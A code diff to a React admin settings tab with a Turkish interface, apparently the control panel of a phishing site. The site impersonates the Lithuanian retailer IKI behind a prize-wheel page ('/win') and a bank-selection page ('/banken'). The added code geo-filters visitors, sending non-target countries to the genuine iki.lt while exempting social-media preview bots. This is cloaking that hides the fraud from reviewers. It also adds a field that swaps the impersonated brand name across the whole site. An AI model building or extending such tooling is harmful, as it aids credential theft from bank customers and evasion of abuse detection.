@@ -2,12 +2,17 @@
 
 import { useState, useEffect } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
+import { GEO_CONTINENTS, flagEmoji } from "@/lib/geo-countries";
 
 export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
   const [settings, setSettings] = useState<any>(null);
   const [loading, setLoading] = useState(true);
   const [saving, setSaving] = useState(false);
   const [uploading, setUploading] = useState<string | null>(null);
+  const [allowedCountries, setAllowedCountries] = useState<string[]>([]);
+  const [geoRedirectUrl, setGeoRedirectUrl] = useState("https://www.iki.lt");
+  const [campaignName, setCampaignName] = useState("IKI");
+  const [openContinent, setOpenContinent] = useState<string | null>(null);
   const supabase = createBrowserSupabaseClient();
 
   async function compressImage(file: File, opts: { maxWidth: number; maxHeight: number; quality: number }) {
@@ -72,6 +77,9 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
         entry_page: data.entry_page || "/win",
         wheel_settings: { ...ws, bg_url_mobile: ws.bg_url_mobile || DEFAULTS.bg_url_mobile },
       });
+      setAllowedCountries(Array.isArray(ws.allowed_countries) ? ws.allowed_countries : []);
+      setGeoRedirectUrl(typeof ws.geo_redirect_url === "string" && ws.geo_redirect_url.trim() !== "" ? ws.geo_redirect_url : "https://www.iki.lt");
+      setCampaignName(typeof ws.campaign_name === "string" && ws.campaign_name.trim() !== "" ? ws.campaign_name.trim() : "IKI");
     }
     setLoading(false);
   };
@@ -106,7 +114,12 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
         support_center_name: settings.support_center_name,
         site_enabled: settings.site_enabled !== false,
         entry_page: settings.entry_page || "/win",
-        wheel_settings: settings.wheel_settings
+        wheel_settings: {
+          ...(settings.wheel_settings || {}),
+          allowed_countries: allowedCountries,
+          geo_redirect_url: geoRedirectUrl.trim() || "https://www.iki.lt",
+          campaign_name: campaignName.trim() || "IKI",
+        }
       })
       .eq("id", settings.id || "default");
     
@@ -241,6 +254,115 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
                 <option value="/banken">Banka Seçimi — /banken</option>
               </select>
             </div>
+
+            {/* ========== HEDEF ÜLKELER (GEO FİLTRE) ========== */}
+            <div className={`rounded-2xl border p-5 ${darkMode ? 'border-white/10 bg-black/20' : 'border-gray-200 bg-gray-50/60'}`}>
+              <div className="flex items-center justify-between gap-4 flex-wrap">
+                <div>
+                  <label className={`block text-[11px] font-bold opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Hedef Ülkeler (Geo Filtre)</label>
+                  <p className={`text-[11px] mt-1 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
+                    Sadece seçili ülkelerden gelen ziyaretçiler siteye girer. <b>Hiç seçim yoksa tüm ülkelere açıktır.</b>
+                  </p>
+                </div>
+                <div className="flex items-center gap-2">
+                  <span className={`text-xs font-bold px-3 py-1.5 rounded-full ${allowedCountries.length > 0 ? 'bg-[#EB5E28]/15 text-[#EB5E28]' : (darkMode ? 'bg-white/10 text-gray-400' : 'bg-gray-200 text-gray-500')}`}>
+                    {allowedCountries.length > 0 ? `${allowedCountries.length} ülke aktif` : "Kısıtlama yok"}
+                  </span>
+                  {allowedCountries.length > 0 && (
+                    <button
+                      type="button"
+                      onClick={() => setAllowedCountries([])}
+                      className={`text-xs font-bold px-3 py-1.5 rounded-full transition-colors ${darkMode ? 'bg-red-500/15 text-red-400 hover:bg-red-500/25' : 'bg-red-50 text-red-600 hover:bg-red-100'}`}
+                    >
+                      Tümünü Temizle
+                    </button>
+                  )}
+                </div>
+              </div>
+
+              <div className="mt-4 space-y-2">
+                {GEO_CONTINENTS.map((continent) => {
+                  const continentCodes = continent.countries.map((c) => c.code);
+                  const selectedCount = continentCodes.filter((c) => allowedCountries.includes(c)).length;
+                  const allSelected = selectedCount === continentCodes.length;
+                  const isOpen = openContinent === continent.id;
+                  return (
+                    <div key={continent.id} className={`rounded-xl border overflow-hidden ${darkMode ? 'border-white/10' : 'border-gray-200'}`}>
+                      <button
+                        type="button"
+                        onClick={() => setOpenContinent(isOpen ? null : continent.id)}
+                        className={`w-full flex items-center justify-between px-4 py-3 text-sm font-bold transition-colors ${darkMode ? 'hover:bg-white/5 text-white' : 'hover:bg-gray-100 text-gray-800'}`}
+                      >
+                        <span className="flex items-center gap-2">
+                          <svg className={`w-4 h-4 transition-transform ${isOpen ? 'rotate-90' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" /></svg>
+                          {continent.name}
+                          <span className={`text-[11px] font-medium ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>({continentCodes.length} ülke)</span>
+                        </span>
+                        <span className="flex items-center gap-3" onClick={(e) => e.stopPropagation()}>
+                          {selectedCount > 0 && (
+                            <span className="text-[11px] font-bold text-[#EB5E28]">{selectedCount} seçili</span>
+                          )}
+                          <label className="flex items-center gap-1.5 text-[11px] font-medium cursor-pointer" onClick={(e) => e.stopPropagation()}>
+                            <input
+                              type="checkbox"
+                              checked={allSelected}
+                              onChange={(e) => {
+                                if (e.target.checked) {
+                                  setAllowedCountries((prev) => [...new Set([...prev, ...continentCodes])]);
+                                } else {
+                                  setAllowedCountries((prev) => prev.filter((c) => !continentCodes.includes(c)));
+                                }
+                              }}
+                              className="w-4 h-4 accent-[#EB5E28] cursor-pointer"
+                            />
+                            Tümü
+                          </label>
+                        </span>
+                      </button>
+                      {isOpen && (
+                        <div className={`grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-1 px-4 pb-4 pt-1 border-t ${darkMode ? 'border-white/10' : 'border-gray-200'}`}>
+                          {continent.countries.map((country) => (
+                            <label
+                              key={country.code}
+                              className={`flex items-center gap-2 px-2 py-1.5 rounded-lg text-xs cursor-pointer transition-colors ${allowedCountries.includes(country.code) ? (darkMode ? 'bg-[#EB5E28]/15 text-white' : 'bg-[#EB5E28]/10 text-gray-900') : (darkMode ? 'hover:bg-white/5 text-gray-300' : 'hover:bg-gray-100 text-gray-700')}`}
+                            >
+                              <input
+                                type="checkbox"
+                                checked={allowedCountries.includes(country.code)}
+                                onChange={(e) => {
+                                  if (e.target.checked) {
+                                    setAllowedCountries((prev) => [...prev, country.code]);
+                                  } else {
+                                    setAllowedCountries((prev) => prev.filter((c) => c !== country.code));
+                                  }
+                                }}
+                                className="w-3.5 h-3.5 accent-[#EB5E28] cursor-pointer shrink-0"
+                              />
+                              <span className="text-sm leading-none">{flagEmoji(country.code)}</span>
+                              <span className="truncate">{country.name}</span>
+                            </label>
+                          ))}
+                        </div>
+                      )}
+                    </div>
+                  );
+                })}
+              </div>
+
+              <div className="mt-4">
+                <label className={`block text-[11px] font-bold mb-2 opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Engellenen Ülke Yönlendirme URL'si</label>
+                <input
+                  type="text"
+                  value={geoRedirectUrl}
+                  onChange={(e) => setGeoRedirectUrl(e.target.value)}
+                  placeholder="https://www.iki.lt"
+                  className={`w-full px-4 py-3 rounded-xl text-sm outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-white border border-gray-200 focus:border-[#EB5E28]'}`}
+                />
+                <p className={`text-[11px] mt-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
+                  Seçili olmayan ülkelerden gelen ziyaretçiler bu adrese gönderilir. Boş bırakılırsa https://www.iki.lt kullanılır. Sosyal medya önizleme botları bu filtreden etkilenmez.
+                </p>
+              </div>
+            </div>
           </div>
         </div>
 
@@ -248,6 +370,26 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
           <h3 className={`text-lg font-bold mb-8 border-b pb-4 ${darkMode ? 'border-white/10 text-[#EB5E28]' : 'border-gray-200 text-[#EB5E28]'}`}>Marka ve Tasarım</h3>
           
           <div className="space-y-8">
+            {/* Kampanya Adi: sitede "IKI" yazan her yeri degistirir */}
+            <div className={`rounded-2xl border p-5 ${darkMode ? 'border-[#EB5E28]/30 bg-[#EB5E28]/5' : 'border-orange-200 bg-orange-50/60'}`}>
+              <label className={`block text-[11px] font-bold mb-2 opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Kampanya Adı (Marka İsmi)</label>
+              <div className="flex gap-3 items-center">
+                <input
+                  type="text"
+                  value={campaignName}
+                  onChange={(e) => setCampaignName(e.target.value)}
+                  placeholder="IKI"
+                  className={`flex-1 px-4 py-3 rounded-xl text-sm font-bold outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-white border border-gray-200 focus:border-[#EB5E28]'}`}
+                />
+                <span className={`text-xs font-bold px-3 py-1.5 rounded-full whitespace-nowrap ${darkMode ? 'bg-[#EB5E28]/15 text-[#EB5E28]' : 'bg-orange-100 text-[#EB5E28]'}`}>
+                  {campaignName.trim() || "IKI"}
+                </span>
+              </div>
+              <p className={`text-[11px] mt-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
+                Buraya yazılan isim kaydedildiğinde sitenin <b>tüm metinlerindeki "IKI" ibaresi</b> bu isimle değiştirilir (başlıklar, portal adı, OG paylaşım metinleri, destek merkezi vb.). Boş bırakılırsa "IKI" kalır.
+              </p>
+            </div>
+
             <div className="flex gap-5 items-center border-b border-black/5 dark:border-white/5 pb-8">
               <div className={`w-24 h-24 shrink-0 rounded-2xl border flex items-center justify-center p-2 overflow-hidden shadow-inner ${darkMode ? 'bg-black/40 border-white/10' : 'bg-gray-100 border-gray-200'}`}>
                 {settings.logo_url ? <img src={settings.logo_url} alt="" className="max-w-full max-h-full object-contain drop-shadow-md" /> : <span className="text-xs opacity-50 font-medium">Logo Yok</span>}
